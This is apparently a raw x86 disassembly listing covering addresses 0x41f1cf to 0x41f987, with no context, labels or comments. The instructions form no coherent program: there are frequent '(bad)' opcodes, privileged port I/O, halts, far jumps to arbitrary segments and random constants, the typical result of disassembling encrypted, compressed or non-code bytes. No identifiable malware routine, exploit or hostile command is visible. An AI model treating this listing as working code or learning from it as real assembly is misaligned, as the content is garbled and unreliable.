  41f1cf:	mov    cl,0xa7
  41f1d1:	dec    edi
  41f1d2:	xor    al,0x9f
  41f1d4:	mov    ecx,0x9eb34f70
  41f1d9:	sub    eax,0x71565f44
  41f1de:	test   BYTE PTR [ebp+ebx*8-0x11d2963],dl
  41f1e5:	add    eax,0x5934ef4
  41f1ea:	adc    al,0xdd
  41f1ec:	or     edx,DWORD PTR [edx+0x3]
  41f1ef:	popa   
  41f1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1f1:	xchg   esp,eax
  41f1f2:	in     al,0x9c
  41f1f4:	jmp    0x41f182
  41f1f6:	pop    esi
  41f1f7:	mov    dh,0xb2
  41f1f9:	add    al,0x7c
  41f1fb:	pop    edx
  41f1fc:	(bad)  
  41f1fd:	fild   DWORD PTR [ecx]
  41f1ff:	lods   al,BYTE PTR ds:[esi]
  41f200:	ja     0x41f1e5
  41f202:	sbb    edx,esi
  41f204:	out    dx,al
  41f205:	jae    0x41f1fd
  41f207:	add    BYTE PTR [ebx-0x55dae8c4],0x41
  41f20e:	push   0x937089d6
  41f213:	push   esp
  41f214:	retf   
  41f215:	test   DWORD PTR [eax-0x652e6e40],edi
  41f21b:	pop    ecx
  41f21c:	pop    es
  41f21d:	push   cs
  41f21e:	pop    esp
  41f21f:	imul   edx,esp,0x4
  41f222:	fnstsw WORD PTR [ebp+0x73773b48]
  41f228:	pop    ebx
  41f229:	sahf   
  41f22a:	in     eax,0x92
  41f22c:	in     eax,dx
  41f22d:	cmp    DWORD PTR [ebp+ebx*2-0x7149230f],ebx
  41f234:	(bad)  
  41f235:	pop    eax
  41f236:	push   ds
  41f237:	mov    al,0x76
  41f239:	test   al,0xde
  41f23b:	add    ah,ah
  41f23d:	lods   eax,DWORD PTR ds:[esi]
  41f23e:	jmp    FWORD PTR [eax]
  41f240:	sbb    dl,dl
  41f242:	xchg   ecx,eax
  41f243:	gs pushf 
  41f245:	fwait
  41f246:	call   0xd9af:0xb12d7333
  41f24d:	scas   eax,DWORD PTR es:[edi]
  41f24e:	ins    DWORD PTR es:[edi],dx
  41f24f:	jmp    0xec06:0x9e3bc271
  41f256:	in     al,dx
  41f257:	lds    ebp,FWORD PTR [ebp+0x6c565727]
  41f25d:	cwde   
  41f25e:	jo     0x41f2b3
  41f260:	fadd   st,st(2)
  41f262:	pop    esi
  41f263:	fwait
  41f264:	and    eax,DWORD PTR ds:0x19a7e4af
  41f26a:	cmp    ebx,edi
  41f26c:	adc    BYTE PTR [eax],dh
  41f26e:	ja     0x41f221
  41f270:	into   
  41f271:	and    al,BYTE PTR [esi+0x14bfc805]
  41f277:	xchg   ebx,eax
  41f278:	ins    BYTE PTR es:[edi],dx
  41f279:	push   ebp
  41f27a:	shr    DWORD PTR [edi-0x1f447b06],0x70
  41f281:	push   0x79
  41f283:	loopne 0x41f250
  41f285:	or     BYTE PTR gs:[esi-0x1c3cc721],dl
  41f28c:	mov    fs,ebp
  41f28e:	push   0x79a061cb
  41f293:	aas    
  41f294:	rol    bl,1
  41f296:	add    al,0x42
  41f298:	sub    BYTE PTR [ebp+0x32],al
  41f29b:	retf   0x4da9
  41f29e:	xchg   ebx,eax
  41f29f:	(bad)  
  41f2a0:	retf   
  41f2a1:	xchg   esi,eax
  41f2a2:	xchg   esi,eax
  41f2a3:	inc    edx
  41f2a4:	fcomi  st,st(7)
  41f2a6:	(bad)  
  41f2a7:	xor    al,0xd3
  41f2a9:	mov    eax,ds:0x55d05aa8
  41f2ae:	nop
  41f2af:	jge    0x41f304
  41f2b1:	xchg   esp,eax
  41f2b2:	(bad)  
  41f2b3:	cdq    
  41f2b4:	push   esi
  41f2b5:	jp     0x41f308
  41f2b7:	fsubr  QWORD PTR [ebp-0x4]
  41f2ba:	add    DWORD PTR [edi+eiz*4+0x2],edx
  41f2be:	and    esi,DWORD PTR [ebx+0x47eb9773]
  41f2c4:	dec    ecx
  41f2c5:	gs jmp 0x41f2a1
  41f2c8:	or     ah,BYTE PTR [esi]
  41f2ca:	jmp    0xa3aa:0x48f6f75c
  41f2d1:	pushf  
  41f2d2:	push   esi
  41f2d3:	xor    edi,DWORD PTR [esi]
  41f2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2d6:	popa   
  41f2d7:	xor    BYTE PTR [edi+eiz*8+0x126fbfe],bh
  41f2de:	pop    eax
  41f2df:	jp     0x41f2cc
  41f2e1:	inc    edi
  41f2e2:	std    
  41f2e3:	sub    ah,BYTE PTR [esi]
  41f2e5:	(bad)
  41f2e9:	xchg   ah,al
  41f2eb:	pop    edi
  41f2ec:	bound  esp,QWORD PTR [edx-0x233615fe]
  41f2f2:	pushf  
  41f2f3:	cmp    BYTE PTR [ecx+0x1a0903c5],ch
  41f2f9:	cmc    
  41f2fa:	or     eax,0x665ce3c5
  41f2ff:	inc    edx
  41f300:	scas   eax,DWORD PTR es:[edi]
  41f301:	push   DWORD PTR [esp+ecx*8-0x33]
  41f305:	dec    ebp
  41f306:	mov    ebx,DWORD PTR [edi+0x60ac13e6]
  41f30c:	int3   
  41f30d:	cld    
  41f30e:	xlat   BYTE PTR ds:[ebx]
  41f30f:	mov    edx,0x37d4149
  41f314:	aam    0x26
  41f316:	out    0x7,al
  41f318:	and    eax,0x1917c95
  41f31d:	stc    
  41f31e:	cs dec ebx
  41f320:	lds    ebp,FWORD PTR [ecx+0x19]
  41f323:	aaa    
  41f324:	ds pop ecx
  41f326:	hlt    
  41f327:	fcmovnbe st,st(4)
  41f329:	dec    ebp
  41f32a:	fstp   TBYTE PTR [ebp-0x1ba39e43]
  41f330:	div    cl
  41f332:	xchg   ebx,eax
  41f333:	add    al,0x20
  41f335:	xchg   esp,eax
  41f336:	xchg   esi,eax
  41f337:	in     al,0xdb
  41f339:	sub    ah,BYTE PTR [eax-0x7d930556]
  41f33f:	and    DWORD PTR [ebx+0x5eae9f49],eax
  41f345:	inc    ebx
  41f346:	mov    ds,WORD PTR [ecx-0x45]
  41f349:	dec    ecx
  41f34a:	inc    ebp
  41f34b:	leave  
  41f34c:	mov    ch,0x25
  41f34e:	adc    eax,0x949a11ce
  41f353:	jmp    0x41f3a2
  41f355:	mov    ecx,0xa1a7146c
  41f35a:	(bad)
  41f35e:	dec    ebp
  41f35f:	(bad)  
  41f360:	xor    al,0xe1
  41f362:	not    BYTE PTR [edx]
  41f364:	push   eax
  41f365:	outs   dx,BYTE PTR ds:[esi]
  41f366:	mov    al,BYTE PTR ds:0xae177075
  41f36c:	out    0xde,eax
  41f36e:	rcl    edx,0xe7
  41f371:	lock add DWORD PTR [edx+0x7c],esi
  41f375:	lahf   
  41f376:	test   cl,0xe1
  41f379:	xor    BYTE PTR [edi+edx*2+0x163360d7],dl
  41f380:	push   0x44
  41f382:	outs   dx,BYTE PTR ds:[esi]
  41f383:	fwait
  41f384:	aas    
  41f385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f386:	cs sbb al,0x7d
  41f389:	mov    ebp,0xcf7a1159
  41f38e:	ss mov dh,0x39
  41f391:	cmc    
  41f392:	arpl   WORD PTR [ebp-0x4d0ff8be],dx
  41f398:	call   0xf7a3:0x21423b19
  41f39f:	push   cs
  41f3a0:	sub    DWORD PTR [eax-0x53168275],esp
  41f3a6:	cli    
  41f3a7:	dec    esi
  41f3a8:	push   ds
  41f3a9:	int3   
  41f3aa:	(bad)  
  41f3ab:	push   cs
  41f3ac:	dec    ebp
  41f3ad:	cld    
  41f3ae:	pushf  
  41f3af:	xchg   ebx,eax
  41f3b0:	ret    
  41f3b1:	mov    ebp,0x912242f8
  41f3b6:	jmp    0x648234b3
  41f3bb:	push   0xc79daf17
  41f3c0:	scas   al,BYTE PTR es:[edi]
  41f3c1:	(bad)  
  41f3c2:	xchg   edx,eax
  41f3c3:	mov    al,ds:0x405fccb7
  41f3c8:	std    
  41f3c9:	sbb    ah,BYTE PTR [ebx]
  41f3cb:	push   es
  41f3cc:	or     BYTE PTR [ebx-0x7e2e6fde],bl
  41f3d2:	das    
  41f3d3:	push   edi
  41f3d4:	gs jp  0x41f42d
  41f3d7:	push   0x8ddfb079
  41f3dc:	ficom  WORD PTR [edi+edx*8]
  41f3df:	jo     0x41f3d3
  41f3e1:	aaa    
  41f3e2:	retf   0x93e0
  41f3e5:	adc    cl,0x24
  41f3e8:	iret   
  41f3e9:	adc    BYTE PTR [edi+0x41],ch
  41f3ec:	repnz out 0xfb,eax
  41f3ef:	outs   dx,BYTE PTR ds:[esi]
  41f3f0:	xchg   DWORD PTR [ebx-0x6aa30a87],eax
  41f3f6:	(bad)  
  41f3f7:	lahf   
  41f3f8:	pusha  
  41f3f9:	call   0x8b70:0x72c1532c
  41f400:	ss inc ecx
  41f402:	sahf   
  41f403:	mov    dl,0xee
  41f405:	ss jmp 0x18296685
  41f40b:	push   ecx
  41f40c:	cs out 0xf7,al
  41f40f:	pop    edi
  41f410:	scas   eax,DWORD PTR es:[edi]
  41f411:	mov    eax,ds:0x7b2152f3
  41f416:	stc    
  41f417:	les    esi,FWORD PTR [ebx-0x79581aba]
  41f41d:	xor    DWORD PTR ds:0x23c78e8,0x71ef4e02
  41f427:	sbb    esp,DWORD PTR [edi-0x63]
  41f42a:	mov    WORD PTR [eax+0x2db26d3f],cs
  41f430:	mov    bh,0x17
  41f432:	jae    0x41f4a5
  41f434:	push   ds
  41f435:	fnstenv [eax]
  41f437:	daa    
  41f438:	hlt    
  41f439:	jne    0x41f3e1
  41f43b:	mov    al,ds:0xe5c60898
  41f440:	lods   al,BYTE PTR ds:[esi]
  41f441:	leave  
  41f442:	jo     0x41f3ea
  41f444:	test   eax,0xbf946860
  41f449:	leave  
  41f44a:	mov    WORD PTR [edx],?
  41f44c:	sub    al,0x26
  41f44e:	inc    ebp
  41f44f:	push   esi
  41f450:	or     DWORD PTR [eax-0x3dd07c28],0xfffffff6
  41f457:	xchg   edi,eax
  41f458:	out    0xd9,al
  41f45a:	inc    edi
  41f45b:	jno    0x41f484
  41f45d:	pop    esi
  41f45e:	repnz and al,dl
  41f461:	dec    esi
  41f462:	or     al,0x2c
  41f464:	dec    esp
  41f465:	outs   dx,DWORD PTR ds:[esi]
  41f466:	push   edi
  41f467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f468:	sbb    eax,0x9a737fb4
  41f46d:	or     BYTE PTR [eax],dl
  41f46f:	loopne 0x41f486
  41f471:	call   FWORD PTR [esi-0x14]
  41f474:	call   0x5694:0xf32b869d
  41f47b:	push   0xffffffb1
  41f47d:	xor    ah,al
  41f47f:	inc    ebp
  41f480:	and    al,BYTE PTR [ebp+edx*4+0x198d95ce]
  41f487:	pop    ecx
  41f488:	inc    edi
  41f489:	xchg   esi,eax
  41f48a:	or     eax,0x3222eca8
  41f48f:	lock dec ebp
  41f491:	ret    
  41f492:	and    bl,BYTE PTR ds:[eax+0xa0212be]
  41f499:	pop    edi
  41f49a:	mov    al,0x76
  41f49c:	add    al,0xf3
  41f49e:	clc    
  41f49f:	mov    BYTE PTR [ebx+ebx*1+0x39],bh
  41f4a3:	jecxz  0x41f42b
  41f4a5:	(bad)  
  41f4a6:	std    
  41f4a7:	shl    DWORD PTR [esi],1
  41f4a9:	sub    edi,esp
  41f4ab:	and    eax,0xa1b1bd95
  41f4b0:	dec    ebx
  41f4b1:	rcr    DWORD PTR [edx+0x4f],1
  41f4b4:	repz scas al,BYTE PTR es:[edi]
  41f4b6:	mov    esp,0x2cead1e9
  41f4bb:	scas   eax,DWORD PTR es:[edi]
  41f4bc:	push   ebx
  41f4bd:	and    dl,BYTE PTR [eax]
  41f4bf:	inc    ebp
  41f4c0:	ror    bl,cl
  41f4c2:	lock sbb BYTE PTR [esi],ah
  41f4c5:	(bad)  
  41f4c6:	push   ecx
  41f4c7:	and    al,0x25
  41f4c9:	repnz xchg bl,ah
  41f4cc:	pop    es
  41f4cd:	jbe    0x41f4da
  41f4cf:	xor    edi,DWORD PTR [edi+0x27]
  41f4d2:	adc    edx,DWORD PTR [ebx+0x53]
  41f4d5:	stc    
  41f4d6:	test   cl,0x72
  41f4d9:	cmp    BYTE PTR [eax],ch
  41f4db:	xlat   BYTE PTR ds:[ebx]
  41f4dc:	mov    al,ds:0x3c0da092
  41f4e1:	fstp   TBYTE PTR [edx-0x73b72416]
  41f4e7:	xor    DWORD PTR [ebx+esi*8],esp
  41f4ea:	pushf  
  41f4eb:	mov    esi,0x12822e52
  41f4f0:	sbb    dl,bl
  41f4f2:	gs add al,0xd2
  41f4f5:	bound  ecx,QWORD PTR [ebx]
  41f4f7:	ins    BYTE PTR es:[edi],dx
  41f4f8:	(bad)  
  41f4f9:	aam    0xd7
  41f4fb:	(bad)  
  41f4fc:	js     0x41f4bc
  41f4fe:	push   eax
  41f4ff:	sti    
  41f500:	jmp    FWORD PTR [edi+0x4d0bdfb6]
  41f506:	and    ah,BYTE PTR [esi+ebp*4]
  41f509:	xchg   esp,eax
  41f50a:	idiv   DWORD PTR ds:0xf135e9fb
  41f510:	sbb    al,0x82
  41f512:	pop    ebx
  41f513:	daa    
  41f514:	enter  0x12d1,0xf6
  41f518:	mov    edi,0x13ea3a24
  41f51d:	call   0x19c11974
  41f522:	jnp    0x41f4d8
  41f524:	fist   DWORD PTR [ebx+0x21]
  41f527:	xor    BYTE PTR [esi],ah
  41f529:	mov    esi,DWORD PTR [ebx+0x61b27737]
  41f52f:	xor    esi,esi
  41f531:	add    DWORD PTR [edx+0x60d6b91c],ecx
  41f537:	or     cl,BYTE PTR [eax-0x39]
  41f53a:	pushf  
  41f53b:	mov    ds:0xf56332c3,eax
  41f540:	test   BYTE PTR [ebp+0x2],bl
  41f543:	pop    esi
  41f544:	sub    al,BYTE PTR [ecx-0x4c8e3d2f]
  41f54a:	imul   esp,DWORD PTR [ebx],0xc77abd5e
  41f550:	repnz sbb edi,esi
  41f553:	gs psubusw mm4,mm7
  41f557:	inc    esp
  41f558:	or     al,0x1b
  41f55a:	or     eax,0xa8d55bd
  41f55f:	sub    al,BYTE PTR [eax-0x4b]
  41f562:	imul   DWORD PTR [edi]
  41f564:	ror    BYTE PTR [ebx+eiz*2+0x7f],cl
  41f568:	popa   
  41f569:	xchg   ebx,eax
  41f56a:	dec    esi
  41f56b:	sbb    al,0xa
  41f56d:	sbb    esp,DWORD PTR [eax]
  41f56f:	ret    
  41f570:	push   es
  41f571:	inc    ebx
  41f572:	popa   
  41f573:	sbb    DWORD PTR [ebp-0x784b7fd2],edx
  41f579:	mov    esi,0x8041bc48
  41f57e:	call   0x5fb4aad0
  41f583:	adc    eax,0xe4424b3c
  41f588:	mov    ah,0x29
  41f58a:	std    
  41f58b:	and    bh,BYTE PTR [esi+0x5c]
  41f58e:	pop    es
  41f58f:	sub    cl,BYTE PTR [edi-0x400f3892]
  41f595:	cmp    DWORD PTR [ebp+0x18],esp
  41f598:	in     eax,0xeb
  41f59a:	sbb    DWORD PTR [ecx],eax
  41f59c:	push   edx
  41f59d:	addr16 mov eax,ds:0xf391
  41f5a1:	add    ch,BYTE PTR [edi-0x91df131]
  41f5a7:	repz adc edx,ebx
  41f5aa:	mov    dh,0x5a
  41f5ac:	xchg   BYTE PTR [esp+esi*2],ah
  41f5af:	ret    
  41f5b0:	push   edi
  41f5b1:	popf   
  41f5b2:	or     ecx,DWORD PTR [ecx-0x5ae3c042]
  41f5b8:	clc    
  41f5b9:	jbe    0x41f61a
  41f5bb:	(bad)  
  41f5bc:	hlt    
  41f5bd:	fs inc edi
  41f5bf:	push   DWORD PTR [ecx+0x0]
  41f5c2:	and    eax,0xf6e5b3ed
  41f5c7:	ds pop eax
  41f5c9:	call   0x9a8f:0xd85671b6
  41f5d0:	lods   al,BYTE PTR ds:[esi]
  41f5d1:	sub    dl,BYTE PTR [edx-0x48]
  41f5d4:	loope  0x41f61a
  41f5d6:	sub    esi,eax
  41f5d8:	mov    ebx,esp
  41f5da:	jecxz  0x41f5c2
  41f5dc:	dec    edi
  41f5dd:	push   ss
  41f5de:	xor    al,0xf0
  41f5e0:	xchg   edx,eax
  41f5e1:	jb     0x41f5f3
  41f5e3:	jb     0x41f619
  41f5e5:	jno    0x41f630
  41f5e7:	or     BYTE PTR [ebx],0x6b
  41f5ea:	jmp    0x41f62e
  41f5ec:	fldenv [eax]
  41f5ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5ef:	jecxz  0x41f61c
  41f5f1:	cmc    
  41f5f2:	add    bh,bl
  41f5f4:	cli    
  41f5f5:	jo     0x41f651
  41f5f7:	iret   
  41f5f8:	cmp    ecx,DWORD PTR [eax+0x1f266747]
  41f5fe:	push   edx
  41f5ff:	xlat   BYTE PTR ds:[ebx]
  41f600:	jmp    0x1c4cd82a
  41f605:	enter  0x9917,0xd5
  41f609:	dec    ebp
  41f60a:	out    0x5,al
  41f60c:	add    esi,DWORD PTR [eax-0x1eabcf68]
  41f612:	loope  0x41f655
  41f614:	jnp    0x41f60d
  41f616:	not    al
  41f618:	or     dh,BYTE PTR [edi-0x5db52c2]
  41f61e:	or     eax,0x683df3ec
  41f623:	loope  0x41f5ea
  41f625:	rol    DWORD PTR [ebx-0x6d432c08],0xb9
  41f62c:	xchg   ebp,eax
  41f62d:	retf   
  41f62e:	mov    ebp,0x79a6fe89
  41f633:	imul   BYTE PTR [ecx-0x7682f1ba]
  41f639:	xor    dh,BYTE PTR [eax]
  41f63b:	mov    al,0xb6
  41f63d:	ja     0x41f653
  41f63f:	ins    BYTE PTR es:[edi],dx
  41f640:	jo     0x41f5e9
  41f642:	jae    0x41f5c5
  41f644:	xchg   DWORD PTR [edx+0x77],ebp
  41f647:	jno    0x41f634
  41f649:	adc    edi,esp
  41f64b:	mul    DWORD PTR [edx-0x7765074]
  41f651:	jae    0x41f5fd
  41f653:	ficomp WORD PTR ds:[ecx-0xc]
  41f657:	xor    cl,dl
  41f659:	popa   
  41f65a:	cmp    eax,0x883ad3f3
  41f65f:	js     0x41f6de
  41f661:	dec    esp
  41f662:	loop   0x41f6d7
  41f664:	jmp    0x41f6da
  41f666:	rol    dh,1
  41f668:	aam    0x11
  41f66a:	mov    dl,0xbd
  41f66c:	xor    bl,BYTE PTR [edx]
  41f66e:	sub    eax,0x6f297c01
  41f673:	fmulp  st(2),st
  41f675:	or     DWORD PTR [edi+0x68],ebp
  41f678:	lods   al,BYTE PTR ds:[esi]
  41f679:	leave  
  41f67a:	(bad)  
  41f67b:	push   es
  41f67c:	out    dx,al
  41f67d:	sub    eax,0x657ba5e
  41f682:	mov    ebx,DWORD PTR [esp+esi*2+0x6d]
  41f686:	cs fwait
  41f688:	pop    ss
  41f689:	jns    0x41f6d6
  41f68b:	add    BYTE PTR [ebp+0x31b44f8e],ch
  41f691:	sbb    al,0x34
  41f693:	mov    ds:0x3f2eb159,eax
  41f698:	test   BYTE PTR [edi],al
  41f69a:	repnz imul ebp,DWORD PTR ds:0xfe9b6576,0xb2f4190f
  41f6a5:	fdivrp st(7),st
  41f6a7:	sar    DWORD PTR [ebx-0x3c],0xce
  41f6ab:	nop
  41f6ac:	pop    edx
  41f6ad:	les    edx,FWORD PTR ss:[edi-0x4]
  41f6b1:	sbb    BYTE PTR [edi-0x1ffa2445],0xdb
  41f6b8:	xor    bl,BYTE PTR [ecx]
  41f6ba:	add    DWORD PTR [ebx],ebp
  41f6bc:	adc    esp,edi
  41f6be:	cmp    dl,al
  41f6c0:	xor    BYTE PTR [ecx],al
  41f6c2:	or     ebx,DWORD PTR [eax+0x2905d1f2]
  41f6c8:	inc    eax
  41f6c9:	pop    eax
  41f6ca:	sbb    eax,0x3ab4d76e
  41f6cf:	inc    ebp
  41f6d0:	inc    eax
  41f6d1:	fdiv   QWORD PTR [ebp-0x75]
  41f6d4:	pop    ebx
  41f6d5:	sub    DWORD PTR [esi+eax*2],esp
  41f6d8:	inc    edi
  41f6d9:	mov    cl,0x57
  41f6db:	add    al,0x39
  41f6dd:	ins    BYTE PTR es:[edi],dx
  41f6de:	cld    
  41f6df:	adc    BYTE PTR [esp+edi*2+0x1bdc3e7e],ch
  41f6e6:	je     0x41f6b6
  41f6e8:	and    BYTE PTR [esp+eiz*2+0x31],bh
  41f6ec:	sar    bh,cl
  41f6ee:	adc    eax,0x8e182f1a
  41f6f3:	and    esp,DWORD PTR [eax-0x2730192a]
  41f6f9:	xchg   ebx,eax
  41f6fa:	sbb    eax,0x34e4a553
  41f6ff:	sbb    bl,ch
  41f701:	lods   al,BYTE PTR ds:[esi]
  41f702:	ror    dl,0xfb
  41f705:	(bad)  
  41f706:	mov    eax,ds:0x39390e1
  41f70b:	mov    ds:0x1eea06b3,eax
  41f710:	rcr    edi,cl
  41f712:	(bad)  
  41f713:	pushf  
  41f714:	mov    edx,DWORD PTR [ebx+0x702f8af]
  41f71a:	jg     0x41f789
  41f71c:	(bad)  
  41f71d:	and    ch,bl
  41f71f:	jecxz  0x41f6eb
  41f721:	daa    
  41f722:	xor    ch,BYTE PTR [edx]
  41f724:	jg     0x41f786
  41f726:	(bad)  
  41f727:	out    0x40,eax
  41f729:	nop
  41f72a:	repz inc esi
  41f72c:	test   al,0xdf
  41f72e:	pop    ds
  41f72f:	ret    0x4fe
  41f732:	aaa    
  41f733:	(bad)  
  41f734:	in     al,0xb
  41f736:	jp     0x41f765
  41f738:	jmp    0x41f7b1
  41f73a:	dec    edi
  41f73b:	div    DWORD PTR [esi-0x71cc79ff]
  41f741:	scas   eax,DWORD PTR es:[edi]
  41f742:	out    dx,al
  41f743:	lock dec ebx
  41f745:	inc    ebx
  41f746:	test   al,0x68
  41f748:	dec    ecx
  41f749:	push   cs
  41f74a:	(bad)  
  41f74c:	lahf   
  41f74d:	push   di
  41f74f:	inc    eax
  41f750:	fisubr DWORD PTR [edx]
  41f752:	ret    
  41f753:	mov    ebp,0x883d1cae
  41f758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f759:	fiadd  DWORD PTR [eax+0x13]
  41f75c:	mov    DWORD PTR [ebp-0x5ac945d2],0xc5aeba49
  41f766:	ss jb  0x41f7e6
  41f769:	les    edx,FWORD PTR [edx+0xdd90ca5]
  41f76f:	mov    WORD PTR [ecx],?
  41f771:	jne    0x41f760
  41f773:	stos   DWORD PTR es:[edi],eax
  41f774:	outs   dx,BYTE PTR ds:[esi]
  41f775:	xor    eax,0x5549a71
  41f77a:	sbb    dh,BYTE PTR [ebx+0x49]
  41f77d:	mov    al,ds:0xf830a746
  41f782:	xchg   esi,eax
  41f783:	jns    0x41f709
  41f785:	mov    ch,dl
  41f787:	push   edx
  41f788:	call   0xf97f594a
  41f78d:	xor    eax,0xce301a92
  41f792:	adc    BYTE PTR [ebp+ebp*8+0x2ca386a7],dh
  41f799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f79a:	adc    esi,DWORD PTR [edx+0xa8011f4]
  41f7a0:	mov    eax,ds:0x9b9c1755
  41f7a5:	adc    DWORD PTR [esi],edi
  41f7a7:	popf   
  41f7a8:	push   es
  41f7a9:	out    0xb4,eax
  41f7ab:	mov    cl,0xaf
  41f7ad:	std    
  41f7ae:	and    eax,0x5d2a8056
  41f7b3:	repz dec ebp
  41f7b5:	fld    TBYTE PTR [esp+eiz*2]
  41f7b8:	scas   al,BYTE PTR es:[edi]
  41f7b9:	leave  
  41f7ba:	jg     0x41f792
  41f7bc:	and    dh,BYTE PTR [ebx]
  41f7be:	loope  0x41f768
  41f7c0:	sar    ah,0xa4
  41f7c3:	daa    
  41f7c4:	push   ds
  41f7c5:	(bad)  
  41f7c6:	jp     0x41f814
  41f7c8:	(bad)  
  41f7c9:	mov    DWORD PTR [eax-0x31],ebp
  41f7cc:	rcr    DWORD PTR [eax],cl
  41f7ce:	out    dx,al
  41f7cf:	in     al,dx
  41f7d0:	push   esp
  41f7d1:	shl    DWORD PTR [ebx-0x9],cl
  41f7d4:	int    0x70
  41f7d6:	pop    ecx
  41f7d7:	mov    edi,0x25c9c892
  41f7dc:	xchg   edi,eax
  41f7dd:	mov    al,ds:0x55d9
  41f7e2:	add    BYTE PTR [eax],al
  41f7e4:	add    BYTE PTR [eax],al
  41f7e6:	out    0xd2,al
  41f7e8:	xchg   esp,eax
  41f7e9:	icebp  
  41f7ea:	mov    ah,0xf7
  41f7ec:	out    0xd7,eax
  41f7ee:	aad    0x75
  41f7f0:	(bad)  
  41f7f1:	adc    DWORD PTR [ebx],ebx
  41f7f3:	jecxz  0x41f827
  41f7f5:	jae    0x41f784
  41f7f7:	lock add DWORD PTR [eax],eax
  41f7fa:	and    al,BYTE PTR [edi]
  41f7fc:	add    BYTE PTR [eax],al
  41f7fe:	mov    ecx,0x9d3361ef
  41f803:	pushf  
  41f804:	sub    al,0xeb
  41f806:	xlat   BYTE PTR ds:[ebx]
  41f807:	jmp    0x4063:0x1416ec34
  41f80e:	xor    ebx,edx
  41f810:	dec    DWORD PTR [ecx]
  41f812:	xor    ecx,edi
  41f814:	mov    eax,0x37489cbe
  41f819:	or     bl,BYTE PTR [edi+edi*4+0x2a801614]
  41f820:	jb     0x41f7cf
  41f822:	repz retf 0x9505
  41f826:	repnz push edi
  41f828:	pop    ss
  41f829:	enter  0xb9e,0x19
  41f82d:	mov    ecx,0x5924c9e7
  41f832:	jbe    0x41f7c7
  41f834:	pop    es
  41f835:	test   DWORD PTR [esp+esi*2-0x51],edi
  41f839:	mov    eax,0xa0cfbb9a
  41f83e:	shufps xmm5,XMMWORD PTR [esi+0x4fc1208c],0x1d
  41f846:	xchg   esi,eax
  41f847:	sub    dh,bh
  41f849:	nop
  41f84a:	pop    es
  41f84b:	ins    DWORD PTR es:[edi],dx
  41f84c:	dec    edx
  41f84d:	push   ds
  41f84e:	mov    esp,0x7272d655
  41f853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f854:	add    BYTE PTR [ecx+0x33a7ade7],bl
  41f85a:	fnsave [ecx+ecx*1-0xce83e06]
  41f861:	outs   dx,BYTE PTR ds:[esi]
  41f862:	test   DWORD PTR [ecx+0x540f5f42],eax
  41f868:	and    al,0xad
  41f86a:	ds icebp 
  41f86c:	repnz mov eax,0x87b6d434
  41f872:	mov    ds:0x6f83272d,al
  41f877:	or     ah,BYTE PTR [ebx+0x2ed4699d]
  41f87d:	out    dx,eax
  41f87e:	dec    esi
  41f87f:	repz sti 
  41f881:	nop
  41f882:	mov    dh,BYTE PTR [edx-0x128717f0]
  41f888:	add    bl,BYTE PTR [eax+0x34a13dba]
  41f88e:	jge    0x41f881
  41f890:	and    BYTE PTR [ebx+0x5cdc0e14],dh
  41f896:	push   edi
  41f897:	push   ebx
  41f898:	fcom   QWORD PTR [eax-0x47d1d123]
  41f89e:	out    0xb8,al
  41f8a0:	out    0xc5,al
  41f8a2:	(bad)  
  41f8a3:	bnd jne 0x41f87f
  41f8a6:	jbe    0x41f849
  41f8a8:	or     ebx,ecx
  41f8aa:	jl     0x41f8a9
  41f8ac:	dec    edx
  41f8ad:	adc    DWORD PTR [ebp+0x76],edx
  41f8b0:	test   eax,0x60deda8f
  41f8b5:	and    DWORD PTR [edx],ebp
  41f8b7:	imul   ebp,DWORD PTR [edx-0x46b10956],0xcd06a80b
  41f8c1:	inc    esi
  41f8c2:	jl     0x41f86a
  41f8c4:	add    DWORD PTR [esi],edi
  41f8c6:	hlt    
  41f8c7:	cmc    
  41f8c8:	ss ss jl 0x41f888
  41f8cc:	push   ebx
  41f8cd:	push   edx
  41f8ce:	mov    esi,0x4d6bc88e
  41f8d3:	jmp    0x9c942061
  41f8d8:	es sbb bl,0x59
  41f8dc:	repnz (bad) 
  41f8de:	cli    
  41f8df:	ret    0x4952
  41f8e2:	adc    ch,bl
  41f8e4:	mov    DWORD PTR [ebx-0x4fd3a7a6],eax
  41f8ea:	mov    al,ds:0x93c339ca
  41f8ef:	sbb    eax,0x86503ad6
  41f8f4:	add    esp,DWORD PTR [eax+0x4c]
  41f8f7:	(bad)  
  41f8f8:	push   ss
  41f8f9:	mov    esi,0x5c774aae
  41f8fe:	adc    BYTE PTR ds:0x6c3b8c29,al
  41f904:	xlat   BYTE PTR ds:[ebx]
  41f905:	mov    esp,0x62bdee56
  41f90a:	xchg   edi,eax
  41f90b:	sub    BYTE PTR [edi],bl
  41f90d:	lds    esp,FWORD PTR [edx+0x31dee1a]
  41f913:	lds    ebx,FWORD PTR [ebp-0x45269368]
  41f919:	adc    DWORD PTR fs:[esi-0x5a4ab131],0x4b43e57f
  41f924:	mul    BYTE PTR [ebp+ebx*1+0x35]
  41f928:	pushf  
  41f929:	or     BYTE PTR [ebx+0x26],al
  41f92c:	sbb    cl,BYTE PTR [eax-0x16cfc8e7]
  41f932:	push   0xaf9922f9
  41f937:	test   eax,0x35396af9
  41f93c:	jne    0x41f948
  41f93e:	outs   dx,DWORD PTR ds:[esi]
  41f93f:	arpl   WORD PTR [ebp-0x6c8832b3],si
  41f945:	xor    DWORD PTR [esi],0xffffffe9
  41f948:	clc    
  41f949:	in     eax,0x76
  41f94b:	into   
  41f94c:	mov    bl,0x40
  41f94e:	sbb    DWORD PTR [eax+0x76bef4c6],0xf66ae59
  41f958:	daa    
  41f959:	mov    ds:0x8b20377e,al
  41f95e:	cwde   
  41f95f:	aaa    
  41f960:	daa    
  41f961:	jl     0x41f96a
  41f963:	les    edi,FWORD PTR [edx+edi*1-0x6f9d25a5]
  41f96a:	or     ch,BYTE PTR [esi-0x744b97cc]
  41f970:	jo     0x41f9cd
  41f972:	mov    bl,0x71
  41f974:	or     al,0x65
  41f976:	(bad)  
  41f978:	cmp    eax,0x683c499c
  41f97d:	jl     0x41f9de
  41f97f:	push   edi
  41f980:	les    ebp,FWORD PTR [ebp+eiz*8+0x7041f396]
  41f987:	ret    0x5613
